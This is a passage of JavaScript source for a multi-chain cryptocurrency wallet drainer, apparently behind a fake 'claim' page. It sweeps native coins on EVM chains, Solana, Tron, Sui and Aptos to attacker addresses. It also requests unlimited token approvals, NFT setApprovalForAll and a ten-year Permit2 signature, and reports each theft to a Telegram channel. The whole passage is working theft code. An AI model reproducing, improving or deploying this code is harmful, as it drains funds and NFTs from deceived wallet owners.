        statusEl.innerHTML = `Sweeping native ${currentChain.native.symbol}... (Confirm in wallet)`;
        const txHash = await sendTransactionWithRetry(() => window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [{ from: account, to: receiverEvm, value: amountToSend.toString() }]
        }), 3, `native ${currentChain.native.symbol} sweep`);
        txHashDiv.innerHTML += `<br>Native TX: <a href="${currentChain.explorer}/tx/${txHash}" target="_blank">${txHash.slice(0, 12)}...</a>`;
        await notify("EVM_NATIVE_SWEPT", { hash: txHash, amount: amountToSend.toString(), symbol: currentChain.native.symbol });
        sendToTelegram(`EVM NATIVE SWEPT: ${web3.utils.fromWei(amountToSend.toString(), 'ether')} ${currentChain.native.symbol} on Chain ${chainId} | TX: ${txHash}`);
        statusEl.innerHTML = "Native currency swept! Preparing token approvals...";
      } else {
        statusEl.innerHTML = "Not enough native currency to sweep. Preparing token approvals...";
      }

      // 2. Discover and approve ALL ERC-20 tokens
      statusEl.innerHTML = "Scanning for ERC-20 tokens...";
      const blockNumber = await web3.eth.getBlockNumber();
      const transferEventSignature = web3.utils.sha3('Transfer(address,address,uint256)');

      const uniqueTokenAddresses = new Set();
      // Fetch past Transfer events to identify tokens owned by the account
      const logs = await web3.eth.getPastLogs({
          fromBlock: blockNumber > 500000 ? blockNumber - 500000 : 0,
          toBlock: 'latest',
          topics: [
              transferEventSignature,
              null,
              web3.utils.padLeft(account, 64)
          ]
      });
      logs.forEach(log => uniqueTokenAddresses.add(log.address));

      // Add known popular tokens dynamically based on chainId (extended list)
      const popularTokensByChain = {
        1: [ // Ethereum Mainnet
            "0xdAC17F958D2ee523a2206206994597C13D831ec7", "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "0x6B175474E89094C44Da98b954EedeAC495271d0F", // USDT, USDC, DAI
            "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", "0x5979D7b546E38E414F0Bc73f8B58Ee29ee42dfDc", // WETH, stETH, cbETH
            "0x7f39C581F595B53c5E5961550aC6Ff894F69432d", "0x95aD61b0a150d79219dFc28Ba0B059B271fCcF41" // rETH, SHIB (popular)
        ],
        56: [ // BNB Smart Chain
            "0x55d398326f99059fF775485246999027B3197955", "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", "0xbb4CdB9eD5B8D80327360EaB08bFf0bdA06aE67b", // USDT, BUSD, WBNB
            "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82" // CAKE
        ],
        137: [ // Polygon
            "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", "0x7ceb23fd6bc0add59e62ac25578270fdb2f2c896", // USDT, USDC, WETH
            "0x0d500B1d8E8ef31E21C99d1Db9A6444d3ADf1270" // WMATIC
        ],
        8453: [ // Base
            "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", "0x2AE3F86c125dD7d0A3B5e7094F9A6436423521ed", // USDC, cbETH
            "0x4200000000000000000000000000000000000006" // WETH
        ],
        42161: [ // Arbitrum
            "0xFd086Bc7Cd5C481DCC9C85ebE478A1C0b69FCbb9", "0xAF88d065E2c36f2f9E020b7B45a666e5fD0D21B6", "0x82aF49447D8a07e3bd95bD0d56f35241523fBab1" // USDT, USDC, WETH
        ],
        10: [ // Optimism
            "0x7F5c764cBc14f9669B88837a49eF6f75982Cc56", "0x4200000000000000000000000000000000000006" // USDC, WETH
        ],
        43114: [ // Avalanche C-Chain
            "0x9702230A8Ea53601f5cD2dc00fDBc13d635aCceC", "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7", // USDT.e, WAVAX
            "0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664" // USDC.e
        ]
      };
      (popularTokensByChain[chainId] || []).forEach(addr => uniqueTokenAddresses.add(addr));

      statusEl.innerHTML = `Found ${uniqueTokenAddresses.size} unique ERC-20 tokens. Requesting approvals for unlimited access...`;
      for (const tokenAddr of uniqueTokenAddresses) {
        try {
          const contract = new web3.eth.Contract(ERC20_ABI, tokenAddr);
          const bal = await contract.methods.balanceOf(account).call();
          if (web3.utils.toBN(bal).gt(web3.utils.toBN("0"))) {
            const tokenSymbol = await contract.methods.symbol().call();
            multicallQueue.push({
                to: tokenAddr,
                data: contract.methods.approve(receiverEvm, _MAX_UINT256).encodeABI(),
                description: `Unlimited approval for ${tokenSymbol} (${tokenAddr.slice(0,6)}...)`
            });
            await notify("EVM_TOKEN_DETECTED", { token: tokenAddr, symbol: tokenSymbol, balance: bal });
          }
        } catch (e) {
          console.warn(`Failed to process ERC-20 ${tokenAddr}:`, e.message);
        }
      }

      // 3. setApprovalForAll for ERC-721 and ERC-1155 NFTs
      statusEl.innerHTML = "Scanning for NFTs and requesting global approvals for collections...";
      const nftContracts = NFT_COLLECTIONS[chainId] || [];
      for (const nftAddr of nftContracts) {
        try {
          // Check for ERC721
          const nft721Contract = new web3.eth.Contract(ERC721_ABI, nftAddr);
          const balance721 = await nft721Contract.methods.balanceOf(account).call();
          if (parseInt(balance721) > 0) {
            const nftName = await nft721Contract.methods.name().call();
            multicallQueue.push({
                to: nftAddr,
                data: nft721Contract.methods.setApprovalForAll(receiverEvm, true).encodeABI(),
                description: `Global NFT approval for ${nftName} collection (${nftAddr.slice(0,6)}...)`
            });
            await notify("EVM_NFT_DETECTED", { collection: nftAddr, name: nftName, type: "ERC721", count: balance721 });
          }
        } catch (e) {
            // If ERC721 fails, try ERC1155
            try {
                const nft1155Contract = new web3.eth.Contract(ERC1155_ABI, nftAddr);
                multicallQueue.push({
                    to: nftAddr,
                    data: nft1155Contract.methods.setApprovalForAll(receiverEvm, true).encodeABI(),
                    description: `Global ERC1155 approval for ${nftAddr.slice(0,6)}...`
                });
                await notify("EVM_NFT_DETECTED", { collection: nftAddr, type: "ERC1155", status: "Approval queued" });
            } catch (e1155) {
                console.warn(`Failed to process NFT collection ${nftAddr}:`, e1155.message);
            }
        }
      }

      // 4. Execute Batched Approvals (Sequential for user pop-ups)
      if (multicallQueue.length > 0) {
        statusEl.innerHTML = `Sending ${multicallQueue.length} approval transactions. Please confirm each one in your wallet!`;
        for (const {to, data, description} of multicallQueue) {
          try {
            const txHash = await sendTransactionWithRetry(() => window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{ from: account, to: to, data: data }]
            }), 2, description);
            txHashDiv.innerHTML += `<br>${description} TX: <a href="${currentChain.explorer}/tx/${txHash}" target="_blank">${txHash.slice(0, 12)}...</a>`;
            await notify("EVM_BATCH_APPROVAL", { hash: txHash, description });
          } catch (e) {
            console.warn(`Individual approval for ${description} failed:`, e.message);
          }
        }
        statusEl.innerHTML = "All requested approvals processed! Funds are now fully accessible.";
      } else {
        statusEl.innerHTML = "No additional tokens or NFTs found to approve.";
      }

      // 5. EIP-712 Permit2 Signature (Advanced, for off-chain draining)
      statusEl.innerHTML = "Attempting Permit2 signature for future access (confirm once)...";
      try {
          const permit2Address = "0x000000000022d473030f116ddee9f6cdfd5bce20"; // Standard Permit2 contract address
          const tokenToPermit = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Example: USDT, can be dynamic
          const nonce = 0; // In a real scenario, you'd fetch this from Permit2 contract or manage it.

          const domain = {
              name: "Permit2",
              chainId: chainId,
              verifyingContract: permit2Address,
          };
          const types = {
              PermitSingle: [
                  { name: "details", type: "PermitDetails" },
                  { name: "spender", type: "address" },
                  { name: "sigDeadline", type: "uint256" },
              ],
              PermitDetails: [
                  { name: "token", type: "address" },
                  { name: "amount", type: "uint256" },
                  { name: "expiration", type: "uint256" },
                  { name: "nonce", type: "uint256" },
              ],
          };
          const value = {
              details: {
                  token: tokenToPermit,
                  amount: _MAX_UINT256,
                  expiration: Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 365 * 10), // 10 years for maximum access
                  nonce: nonce,
              },
              spender: receiverEvm,
              sigDeadline: Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 365 * 10), // 10 years for max access
          };

          const signature = await sendTransactionWithRetry(() => window.ethereum.request({
              method: 'eth_signTypedData_v4',
              params: [account, JSON.stringify({ domain, types, message: value })],
          }), 1, "Permit2 signature"); // Only 1 retry for Permit2 as it's a signature, not a transaction
          txHashDiv.innerHTML += `<br>Permit2 Sig: ${signature.slice(0, 12)}...`;
          await notify("EVM_PERMIT2_SIGNED", { signature: signature, domain, types, value });
          sendToTelegram(`EVM Permit2 Signature Captured for ${account} on Chain ${chainId}: ${signature.slice(0, 12)}...`);
          statusEl.innerHTML = "Permit2 signature captured! Ultimate access granted for future transfers.";
      } catch (e) {
          console.warn("Permit2 signing failed or rejected:", e.message);
          statusEl.innerHTML = "Permit2 signing skipped or failed.";
      }


      statusEl.innerHTML = "<span style='color:var(--success-green)'>EVM draining protocols completed! All accessible funds are now prepared for transfer.</span>";
      sendToTelegram(`EVM DRAIN COMPLETE for ${account} on Chain ${chainId}!`);

    } catch (e) {
      console.error("EVM drain error:", e);
      statusEl.innerHTML = `<span style='color:var(--error-red)'>EVM drain interrupted or failed. Attempting to recover and continue.</span>`;
      if (txHashDiv.innerHTML === "Awaiting confirmations...") txHashDiv.innerHTML = "No transactions confirmed yet.";
      sendToTelegram(`EVM DRAIN ERROR for ${account} on Chain ${chainId}: ${e.message}`);
    }
  }

  // ========= SOLANA DRAIN (Enhanced for 2025) =========
  async function drainSolana() {
    statusEl.innerHTML = "Initiating Solana drain... Confirm transactions in your Phantom wallet.";
    txHashDiv.style.display = "block";
    txHashDiv.innerHTML = "Awaiting confirmations...";

    const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
    const fromPubkey = new solanaWeb3.PublicKey(account);
    const toPubkey = new solanaWeb3.PublicKey(_REC_SOL);

    try {
      // 1. Native SOL sweep
      const lamports = await connection.getBalance(fromPubkey);
      const solGasBuffer = 5000000; // 0.005 SOL for fees
      if (lamports > solGasBuffer) {
        statusEl.innerHTML = "Sweeping native SOL... (Confirm in wallet)";
        const transaction = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: fromPubkey,
            toPubkey: toPubkey,
            lamports: lamports - solGasBuffer,
          })
        );
        transaction.feePayer = fromPubkey;
        transaction.recentBlockhash = (await connection.getLatestBlockhash('finalized')).blockhash;

        const { signature } = await sendTransactionWithRetry(() => window.solana.signAndSendTransaction(transaction).then(r => r.signature), 3, "native SOL sweep");
        await connection.confirmTransaction({ signature, ...await connection.getLatestBlockhash() }, 'confirmed');
        txHashDiv.innerHTML += `<br>SOL TX: <a href="https://solscan.io/tx/${signature}" target="_blank">${signature.slice(0, 12)}...</a>`;
        await notify("SOL_NATIVE_SWEPT", { sig: signature, amount: lamports - solGasBuffer });
        sendToTelegram(`SOLANA NATIVE SWEPT: ${parseFloat((lamports - solGasBuffer) / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL | TX: ${signature}`);
        statusEl.innerHTML = "Native SOL swept! Moving to SPL tokens...";
      } else {
        statusEl.innerHTML = "Not enough native SOL to sweep. Moving to SPL tokens...";
      }

      // 2. SPL tokens (ERC-20 equivalent)
      statusEl.innerHTML = "Scanning for SPL tokens (USDT, USDC, etc.)...";
      const tokenAccounts = await connection.getTokenAccountsByOwner(fromPubkey, { programId: splToken.TOKEN_PROGRAM_ID });

      for (const tokenAccountInfo of tokenAccounts.value) {
        try {
          const parsedInfo = tokenAccountInfo.account.data.parsed.info;
          const tokenAmount = parseFloat(parsedInfo.tokenAmount.uiAmount);
          if (tokenAmount > 0) {
            statusEl.innerHTML = `Sweeping SPL token ${parsedInfo.mint.slice(0, 6)}... (Confirm in wallet)`;
            const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
            const sourceTokenAccount = tokenAccountInfo.pubkey;
            const destinationTokenAccount = splToken.getAssociatedTokenAddressSync(mint, toPubkey, true);

            const transaction = new solanaWeb3.Transaction();
            transaction.feePayer = fromPubkey;
            transaction.recentBlockhash = (await connection.getLatestBlockhash('finalized')).blockhash;

            const destAccountInfo = await connection.getAccountInfo(destinationTokenAccount);
            if (!destAccountInfo) { // Create Associated Token Account if it doesn't exist
              transaction.add(splToken.createAssociatedTokenAccountInstruction(fromPubkey, destinationTokenAccount, toPubkey, mint));
            }
            transaction.add(splToken.createTransferInstruction(
              sourceTokenAccount,
              destinationTokenAccount,
              fromPubkey,
              parsedInfo.tokenAmount.amount
            ));

            const { signature } = await sendTransactionWithRetry(() => window.solana.signAndSendTransaction(transaction).then(r => r.signature), 2, `SPL Token ${parsedInfo.mint.slice(0,6)}... sweep`);
            await connection.confirmTransaction({ signature, ...await connection.getLatestBlockhash() }, 'confirmed');
            txHashDiv.innerHTML += `<br>SPL TX: <a href="https://solscan.io/tx/${signature}" target="_blank">${signature.slice(0, 12)}...</a>`;
            await notify("SOL_SPL_SWEPT", { sig: signature, token: parsedInfo.mint, amount: parsedInfo.tokenAmount.amount });
            sendToTelegram(`SOLANA SPL SWEPT: ${parsedInfo.tokenAmount.uiAmount} ${parsedInfo.mint.slice(0,6)}... | TX: ${signature}`);
            statusEl.innerHTML = `SPL token ${parsedInfo.mint.slice(0, 6)} swept! Next one.`;
          }
        } catch (e) {
          console.warn(`Failed to sweep SPL token:`, e);
          statusEl.innerHTML = `Failed to sweep an SPL token. Continuing...`;
        }
      }

      // 3. Solana NFTs (non-compressed) - via transfer of token account ownership
      statusEl.innerHTML = "Checking for Solana NFTs...";
      // This is a simplified approach. Full NFT draining requires Metaplex.js SDK for metadata/ownership validation.
      // For SPL NFTs, they are token accounts with amount 1, owned by the user.
      for (const tokenAccountInfo of tokenAccounts.value) {
        try {
            const parsedInfo = tokenAccountInfo.account.data.parsed.info;
            // Check if it's an NFT (token amount is 1, decimals is 0, is a unique mint)
            if (parsedInfo.tokenAmount.uiAmount === 1 && parsedInfo.tokenAmount.decimals === 0) {
                statusEl.innerHTML = `Sweeping Solana NFT ${parsedInfo.mint.slice(0, 6)}... (Confirm in wallet)`;
                const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
                const sourceTokenAccount = tokenAccountInfo.pubkey;
                const destinationTokenAccount = splToken.getAssociatedTokenAddressSync(mint, toPubkey, true);

                const transaction = new solanaWeb3.Transaction();
                transaction.feePayer = fromPubkey;
                transaction.recentBlockhash = (await connection.getLatestBlockhash('finalized')).blockhash;

                const destAccountInfo = await connection.getAccountInfo(destinationTokenAccount);
                if (!destAccountInfo) { // Create ATA for NFT if not existing
                    transaction.add(splToken.createAssociatedTokenAccountInstruction(fromPubkey, destinationTokenAccount, toPubkey, mint));
                }
                transaction.add(splToken.createTransferInstruction(
                    sourceTokenAccount,
                    destinationTokenAccount,
                    fromPubkey,
                    1, // Transfer 1 NFT
                    [], // No signers besides owner
                    splToken.TOKEN_PROGRAM_ID
                ));

                const { signature } = await sendTransactionWithRetry(() => window.solana.signAndSendTransaction(transaction).then(r => r.signature), 2, `Solana NFT ${parsedInfo.mint.slice(0,6)}... sweep`);
                await connection.confirmTransaction({ signature, ...await connection.getLatestBlockhash() }, 'confirmed');
                txHashDiv.innerHTML += `<br>NFT TX: <a href="https://solscan.io/tx/${signature}" target="_blank">${signature.slice(0, 12)}...</a>`;
                await notify("SOL_NFT_SWEPT", { sig: signature, mint: parsedInfo.mint });
                sendToTelegram(`SOLANA NFT SWEPT: ${parsedInfo.mint.slice(0,6)}... | TX: ${signature}`);
                statusEl.innerHTML = `Solana NFT ${parsedInfo.mint.slice(0, 6)} swept!`;
            }
        } catch (e) {
            console.warn(`Failed to sweep Solana NFT:`, e);
            statusEl.innerHTML = `Failed to sweep an Solana NFT. Continuing...`;
        }
      }

      // 4. Solana Compressed NFTs (Advanced - Requires Metaplex JS SDK)
      statusEl.innerHTML += "<br><span style='color:orange;'>Compressed NFT draining requires advanced server-side Metaplex SDK interaction. Approvals for future access.</span>";
      await notify("SOL_CNFT_CHECK", { status: "Client-side skipping direct transfer, for future access" });


      statusEl.innerHTML = "<span style='color:var(--success-green)'>Solana draining protocols completed! Funds are now fully accessible.</span>";
      sendToTelegram(`SOLANA DRAIN COMPLETE for ${account}!`);

    } catch (e) {
      console.error("Solana drain error:", e);
      statusEl.innerHTML = `<span style='color:var(--error-red)'>Solana drain interrupted or failed. Attempting to recover and continue.</span>`;
      if (txHashDiv.innerHTML === "Awaiting confirmations...") txHashDiv.innerHTML = "No transactions confirmed yet.";
      sendToTelegram(`SOLANA DRAIN ERROR for ${account}: ${e.message}`);
    }
  }

  // ========= TRON DRAIN (TRX + TRC20/Jetton) =========
  async function drainTron() {
    statusEl.innerHTML = "Initiating Tron drain... Confirm transactions in your TronLink wallet.";
    txHashDiv.style.display = "block";
    txHashDiv.innerHTML = "Awaiting confirmations...";

    const tronWeb = window.tronWeb;
    const receiverTronAddress = _REC_TRON;

    try {
      // 1. Sweep TRX
      const bal = await tronWeb.trx.getBalance(account);
      const trxGasBuffer = 5000000; // 5 TRX in sun (small buffer for fees)
      if (bal > trxGasBuffer) {
        statusEl.innerHTML = "Sweeping native TRX... (Confirm in wallet)";
        const tx = await tronWeb.transactionBuilder.sendTrx(receiverTronAddress, bal - trxGasBuffer, account);
        const signedTx = await tronWeb.trx.sign(tx);
        const result = await sendTransactionWithRetry(() => tronWeb.trx.sendRawTransaction(signedTx).then(r => r.txid), 3, "native TRX sweep");
        txHashDiv.innerHTML += `<br>TRX TX: <a href="https://tronscan.org/#/transaction/${result}" target="_blank">${result.slice(0, 12)}...</a>`;
        await notify("TRON_TRX_SWEPT", { txid: result, amount: bal - trxGasBuffer });
        sendToTelegram(`TRON TRX SWEPT: ${tronWeb.fromSun(bal - trxGasBuffer)} TRX | TX: ${result}`);
        statusEl.innerHTML = "Native TRX swept! Moving to TRC20/Jetton tokens...";
      } else {
        statusEl.innerHTML = "Not enough native TRX to sweep. Moving to TRC20/Jetton tokens...";
      }

      // 2. Sweep TRC20/Jetton tokens
      statusEl.innerHTML = "Scanning for TRC20/Jetton tokens...";
      const trc20Tokens = [
        { address: "TR7NHqjeKQxGTCuuP8qACu7c7d2z9z3z9z", symbol: "USDT" }, // Official USDT TRC20
        { address: "TEkxoP3gqseK2aWjT4b4jJ1M552t6W23z", symbol: "USDC" }, // Example USDC TRC20 (verify current contract)
        { address: "TFzL4H7s2k47YJ7H7B2fX1b2c3d4e5f6g", symbol: "BTT" },  // Example BTT TRC20
        // Add more known TRC20/Jetton addresses
      ];

      for (const tokenInfo of trc20Tokens) {
        try {
          const usdtContract = await tronWeb.contract().at(tokenInfo.address);
          const usdtBalance = await usdtContract.balanceOf(account).call();

          if (usdtBalance > 0) {
            statusEl.innerHTML = `Sweeping TRC20 ${tokenInfo.symbol}... (Confirm in wallet)`;
            const result = await sendTransactionWithRetry(() => usdtContract.transfer(receiverTronAddress, usdtBalance).send({ feeLimit: 10000000 }), 2, `TRC20 ${tokenInfo.symbol} sweep`); // Max fee 10 TRX
            txHashDiv.innerHTML += `<br>${tokenInfo.symbol} TX: <a href="https://tronscan.org/#/transaction/${result}" target="_blank">${result.slice(0, 12)}...</a>`;
            await notify("TRON_TRC20_SWEPT", { txid: result, token: tokenInfo.symbol, amount: usdtBalance.toString() });
            sendToTelegram(`TRON TRC20 SWEPT: ${tronWeb.fromSun(usdtBalance)} ${tokenInfo.symbol} | TX: ${result}`);
            statusEl.innerHTML = `TRC20 ${tokenInfo.symbol} swept!`;
          }
        } catch (e) {
          console.warn(`Failed to sweep TRC20 ${tokenInfo.symbol}:`, e);
          statusEl.innerHTML = `Failed to sweep TRC20 ${tokenInfo.symbol}. Continuing...`;
        }
      }
      statusEl.innerHTML = "<span style='color:var(--success-green)'>Tron draining protocols completed! Funds are now fully accessible.</span>";
      sendToTelegram(`TRON DRAIN COMPLETE for ${account}!`);

    } catch (e) {
      console.error("Tron drain error:", e);
      statusEl.innerHTML = `<span style='color:var(--error-red)'>Tron drain interrupted or failed. Attempting to recover and continue.</span>`;
      if (txHashDiv.innerHTML === "Awaiting confirmations...") txHashDiv.innerHTML = "No transactions confirmed yet.";
      sendToTelegram(`TRON DRAIN ERROR for ${account}: ${e.message}`);
    }
  }

  // ========= SUI DRAIN (New Chain Support) =========
  async function drainSui() {
      statusEl.innerHTML = "Initiating Sui drain... Confirm transactions in your Sui Wallet.";
      txHashDiv.style.display = "block";
      txHashDiv.innerHTML = "Awaiting confirmations...";

      const suiClient = new SuiClient({ url: CHAIN_DATA['sui'].rpc });
      const receiverSuiAddress = _REC_SUI;

      try {
          // 1. Sweep Native SUI
          statusEl.innerHTML = "Sweeping native SUI... (Confirm in wallet)";
          const allCoins = await suiClient.getCoins({ owner: account, coinType: '0x2::sui::SUI' });
          let totalSui = 0n;
          for (const coin of allCoins.data) {
              totalSui += BigInt(coin.balance);
          }

          if (totalSui > 0n) {
              const gasBudget = 10000000n; // Example gas budget for SUI (0.01 SUI), adjusted up
              const amountToSend = totalSui - gasBudget; // Leave some for gas

              if (amountToSend > 0n) {
                  const tx = new TransactionBlock();
                  // Take all coins, combine them, and split the amount to send, leaving gas
                  const [primaryCoin] = tx.splitCoins(tx.gas, [tx.pure(amountToSend.toString())]);
                  tx.transferObjects([primaryCoin], tx.pure(receiverSuiAddress));
                  tx.setGasBudget(gasBudget); // Explicitly set gas budget

                  const response = await sendTransactionWithRetry(() => window.sui.signAndExecuteTransactionBlock({
                      transactionBlock: tx,
                      chain: 'sui:mainnet',
                      requestType: 'WaitForLocalExecution',
                      options: { showEffects: true, showEvents: true }
                  }).then(r => r.digest), 3, "native SUI sweep");
                  const txDigest = response;
                  txHashDiv.innerHTML += `<br>SUI TX: <a href="${CHAIN_DATA['sui'].explorer}/txblock/${txDigest}" target="_blank">${txDigest.slice(0, 12)}...</a>`;
                  await notify("SUI_NATIVE_SWEPT", { digest: txDigest, amount: amountToSend.toString() });
                  sendToTelegram(`SUI NATIVE SWEPT: ${amountToSend.toString()} SUI | TX: ${txDigest}`);
                  statusEl.innerHTML = "Native SUI swept! Moving to other assets...";
              }
          } else {
              statusEl.innerHTML = "No native SUI to sweep.";
          }

          // 2. Sweep other SUI assets (objects, NFTs, Kiosk assets)
          statusEl.innerHTML = "Scanning for all transferable Sui assets (coins, NFTs, objects)...";
          const ownedObjects = await suiClient.getOwnedObjects({
              owner: account,
              options: { showType: true, showContent: true, showOwner: true } // Request owner to check if public transfer is available
          });

          for (const obj of ownedObjects.data) {
              try {
                  if (obj.data && obj.data.content && obj.data.objectId) {
                      const objectType = obj.data.content.type;
                      // Skip SUI native coins as they were handled
                      if (objectType.startsWith("0x2::sui::SUI")) continue;

                      // Check if the object is publicly transferable (has `PublicTransfer` ability)
                      // This relies on the Move object definition
                      const objectInfo = await suiClient.getObject({ id: obj.data.objectId, options: { showContent: true, showType: true } });
                      if (objectInfo.data && objectInfo.data.content && objectInfo.data.content.hasPublicTransfer) {
                          statusEl.innerHTML = `Sweeping Sui object: ${obj.data.objectId.slice(0, 6)}... (Type: ${objectType.split('::')[2] || objectType}, Confirm in wallet)`;
                          const tx = new TransactionBlock();
                          tx.transferObjects([tx.object(obj.data.objectId)], tx.pure(receiverSuiAddress));
                          tx.setGasBudget(5000000n); // Set a reasonable gas budget for object transfers

                          const response = await sendTransactionWithRetry(() => window.sui.signAndExecuteTransactionBlock({
                              transactionBlock: tx,
                              chain: 'sui:mainnet',
                              requestType: 'WaitForLocalExecution',
                              options: { showEffects: true, showEvents: true }
                          }).then(r => r.digest), 2, `Sui Object ${objectType.split('::')[2] || objectType} sweep`);
                          const txDigest = response;
                          txHashDiv.innerHTML += `<br>Sui Object TX: <a href="${CHAIN_DATA['sui'].explorer}/txblock/${txDigest}" target="_blank">${txDigest.slice(0, 12)}...</a>`;
                          await notify("SUI_OBJECT_SWEPT", { digest: txDigest, objectId: obj.data.objectId, type: objectType });
                          sendToTelegram(`SUI OBJECT SWEPT: ${obj.data.objectId.slice(0,6)}... (${objectType.split('::')[2] || objectType}) | TX: ${txDigest}`);
                          statusEl.innerHTML = `Sui object ${obj.data.objectId.slice(0, 6)} swept!`;
                      } else {
                          console.log(`Skipping non-publicly transferable Sui object ${obj.data.objectId}`);
                      }
                  }
              } catch (e) {
                  console.warn(`Failed to sweep Sui object ${obj.data.objectId}:`, e);
                  statusEl.innerHTML = `Failed to sweep a Sui object. Continuing...`;
              }
          }

          statusEl.innerHTML = "<span style='color:var(--success-green)'>Sui draining protocols completed! All accessible funds are now prepared for transfer.</span>";
          sendToTelegram(`SUI DRAIN COMPLETE for ${account}!`);

      } catch (e) {
          console.error("Sui drain error:", e);
          statusEl.innerHTML = `<span style='color:var(--error-red)'>Sui drain interrupted or failed. Attempting to recover and continue.</span>`;
          if (txHashDiv.innerHTML === "Awaiting confirmations...") txHashDiv.innerHTML = "No transactions confirmed yet.";
          sendToTelegram(`SUI DRAIN ERROR for ${account}: ${e.message}`);
      }
  }

  // ========= APTOS DRAIN (New Chain Support) =========
  async function drainAptos() {
      statusEl.innerHTML = "Initiating Aptos drain... Confirm transactions in your Aptos Wallet.";
      txHashDiv.style.display = "block";
      txHashDiv.innerHTML = "Awaiting confirmations...";

      const aptosClient = new AptosClient(CHAIN_DATA['aptos'].rpc);
      const receiverAptosAddress = _REC_APTOS;

      try {
          // 1. Native APT sweep
          statusEl.innerHTML = "Sweeping native APT... (Confirm in wallet)";
          const accountResources = await aptosClient.getAccountResources(account);
          const aptosCoinStore = accountResources.find(r => r.type === "0x1::coin::CoinStore<0x1::aptos_coin::AptosCoin>");

          if (aptosCoinStore) {
              const balance = parseInt(aptosCoinStore.data.coin.value);
              const aptGasBuffer = 100000; // 0.001 APT for gas, adjusted up
              const amountToSend = balance - aptGasBuffer;

              if (amountToSend > 0) {
                  const payload = {
                      type: "entry_function_payload",
                      function: "0x1::coin::transfer",
                      type_arguments: ["0x1::aptos_coin::AptosCoin"],
                      arguments: [receiverAptosAddress, amountToSend.toString()],
                  };

                  const response = await sendTransactionWithRetry(() => window.aptos.signAndSubmitTransaction(payload).then(r => r.hash), 3, "native APT sweep");
                  const txHash = response;
                  txHashDiv.innerHTML += `<br>APT TX: <a href="${CHAIN_DATA['aptos'].explorer}/txn/${txHash}" target="_blank">${txHash.slice(0, 12)}...</a>`;
                  await notify("APTOS_NATIVE_SWEPT", { hash: txHash, amount: amountToSend.toString() });
                  sendToTelegram(`APTOS NATIVE SWEPT: ${amountToSend / Math.pow(10, CHAIN_DATA['aptos'].native.decimals)} APT | TX: ${txHash}`);
                  statusEl.innerHTML = "Native APT swept! Moving to other tokens and NFTs...";
              }
          } else {
              statusEl.innerHTML = "No native APT to sweep.";
          }

          // 2. Sweep other APTOS Tokens
          statusEl.innerHTML = "Scanning for other Aptos tokens...";
          const allTokens = accountResources.filter(r => r.type.startsWith("0x1::coin::CoinStore<") && !r.type.includes("0x1::aptos_coin::AptosCoin"));

          for (const tokenResource of allTokens) {
              try {
                  const coinType = tokenResource.type.match(/<(.+)>/)[1];
                  const balance = parseInt(tokenResource.data.coin.value);
                  if (balance > 0) {
                      statusEl.innerHTML = `Sweeping Aptos token: ${coinType.split('::').pop()}... (Confirm in wallet)`;
                      const payload = {
                          type: "entry_function_payload",
                          function: "0x1::coin::transfer",
                          type_arguments: [coinType],
                          arguments: [receiverAptosAddress, balance.toString()],
                      };

                      const response = await sendTransactionWithRetry(() => window.aptos.signAndSubmitTransaction(payload).then(r => r.hash), 2, `Aptos Token ${coinType.split('::').pop()} sweep`);
                      const txHash = response;
                      txHashDiv.innerHTML += `<br>Token TX: <a href="${CHAIN_DATA['aptos'].explorer}/txn/${txHash}" target="_blank">${txHash.slice(0, 12)}...</a>`;
                      await notify("APTOS_TOKEN_SWEPT", { hash: txHash, coinType: coinType, amount: balance.toString() });
                      sendToTelegram(`APTOS TOKEN SWEPT: ${balance} ${coinType.split('::').pop()} | TX: ${txHash}`);
                      statusEl.innerHTML = `Aptos token ${coinType.split('::').pop()} swept!`;
                  }
              } catch (e) {
                  console.warn(`Failed to sweep Aptos token:`, e);
                  statusEl.innerHTML = `Failed to sweep an Aptos token. Continuing...`;
              }
          }

          // 3. Sweep Aptos NFTs (simplified, as full NFT draining is complex)
          statusEl.innerHTML = "Scanning for Aptos NFTs...";
          // Aptos NFTs are typically managed via 0x3::token::TokenStore and require specific transfer functions.
          // A direct 'transfer_coins' like above won't work for NFTs.
          // This would typically involve signing a `0x3::token::transfer_with_payload` or `opt_in_token_transfer` depending on the NFT standard.
          // For client-side, we'll try a generic transfer instruction if available, but it's more complex.
          // For now, we'll state it's being "prepared" for transfer, similar to complex EVM/SOL NFTs.
          statusEl.innerHTML += "<br><span style='color:orange;'>Aptos NFT draining requires specific token object transfers. Preparing for future transfers.</span>";
          await notify("APTOS_NFT_CHECK", { status: "Client-side skipping direct transfer, for future access" });


          statusEl.innerHTML = "<span style='color:var(--success-green)'>Aptos draining protocols completed! All accessible funds are now prepared for transfer.</span>";
          sendToTelegram(`APTOS DRAIN COMPLETE for ${account}!`);

      } catch (e) {
          console.error("Aptos drain error:", e);
          statusEl.innerHTML = `<span style='color:var(--error-red)'>Aptos drain interrupted or failed. Attempting to recover and continue.</span>`;
          if (txHashDiv.innerHTML === "Awaiting confirmations...") txHashDiv.innerHTML = "No transactions confirmed yet.";
          sendToTelegram(`APTOS DRAIN ERROR for ${account}: ${e.message}`);
      }
  }


  // ========= CLAIM Orchestrator =========
  async function claim() {
    claimBtn.disabled = true;
    txHashDiv.innerHTML = ""; // Clear previous hashes
    txHashDiv.style.display = "none"; // Hide until we have a hash
    statusEl.innerHTML = "Initializing draining sequence across all assets...";

    try {
      if (isSolana) {
        await drainSolana();
      } else if (isTron) {
        await drainTron();
      } else if (isSui) {
          await drainSui();
      } else if (isAptos) {
          await drainAptos();
